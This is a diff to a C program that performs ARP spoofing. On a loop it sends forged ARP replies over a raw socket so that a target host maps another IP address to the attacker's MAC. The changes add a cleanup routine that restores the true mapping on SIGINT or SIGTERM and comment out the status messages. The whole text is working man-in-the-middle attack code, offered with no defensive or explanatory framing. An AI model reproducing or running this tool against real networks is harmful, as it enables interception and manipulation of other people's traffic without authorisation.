@@ -18,31 +18,33 @@ typedef struct
   uint32_t dst_ip;
   uint8_t  target_mac[6];
   uint8_t  dst_mac[6];
+  uint8_t  own_mac[6];
 } info_t;
 
 void sigint(int n);
+void sigterm(int n);
 void arguments(int argc, char **argv, info_t *info);
 
+struct pack packet;
+info_t inf;
 int rsock;
 
 int main(int argc, char **argv)
 {
-  struct pack packet;
-  info_t inf;
-
   arguments(argc, argv, &inf);
   signal(SIGINT, sigint);
+  signal(SIGTERM, sigterm);
 
   rsock = create_raw_socket();
   inf.ifidx = get_interface_id(rsock, argv[1]);
-  get_interface_addr(rsock, argv[1], inf.dst_mac);
+  get_interface_addr(rsock, argv[1], inf.own_mac);
   bind_interface(rsock, inf.ifidx);
-  printf("--- Start forwarding packets ---\n");
+  /*printf("--- Start forwarding packets ---\n");*/
 
-  craft_eth(&packet.eth_head, 0x0806, inf.dst_mac, inf.target_mac);
+  craft_eth(&packet.eth_head, 0x0806, inf.own_mac, inf.target_mac);
 
   craft_arp(&packet.arp_head, ARP_REPLY,
-	    inf.dst_mac, (uint8_t *)&inf.dst_ip,
+	    inf.own_mac, (uint8_t *)&inf.dst_ip,
 	    inf.target_mac, (uint8_t *)&inf.target_ip);
 
   while (1)
@@ -52,17 +54,16 @@ int main(int argc, char **argv)
       sleep(1);
     }
 
-  printf("--- Stop forwarding packets ---\n");
-  close(rsock);
+  /*printf("--- Stop forwarding packets ---\n");*/
   return (EXIT_SUCCESS);
 }
 
 void arguments(int argc, char **argv, info_t *info)
 {
-  if (argc != 5)
+  if (argc != 6)
     {
       fprintf(stderr, "Usage: %s interface target_ip"
-	      " target_mac dest_ip\n", argv[0]);
+	      " target_mac dest_ip dest_mac\n", argv[0]);
       exit(EXIT_FAILURE);
     }
   info->target_ip = htonl(iptolong(argv[2]));
@@ -72,12 +73,38 @@ void arguments(int argc, char **argv, info_t *info)
       fprintf(stderr, "Error: MAC address is not valid.\n");
       exit(EXIT_FAILURE);
     }
+  if (mactoa(argv[5], info->dst_mac) == -1)
+    {
+      fprintf(stderr, "Error: MAC address is not valid.\n");
+      exit(EXIT_FAILURE);
+    }
+}
+
+void restoreHwAddr()
+{
+  craft_eth(&packet.eth_head, 0x0806, inf.own_mac, inf.target_mac);
+
+  craft_arp(&packet.arp_head, ARP_REPLY,
+	    inf.dst_mac, (uint8_t *)&inf.dst_ip,
+	    inf.target_mac, (uint8_t *)&inf.target_ip);
+
+  if (write(rsock, &packet, sizeof(packet)) == -1)
+    fprintf(stderr, "write(): Error: %s.\n", strerror(errno));
+}
+
+void sigterm(int n)
+{
+  (void) n;
+  restoreHwAddr();
+  close(rsock);
+  exit(EXIT_SUCCESS);
 }
 
 void sigint(int n)
 {
   (void) n;
-  printf("\r--- Stop forwarding packets ---\n");
+  restoreHwAddr();
+  /*printf("\r--- Stop forwarding packets ---\n");*/
   close(rsock);
   exit(EXIT_SUCCESS);
 }
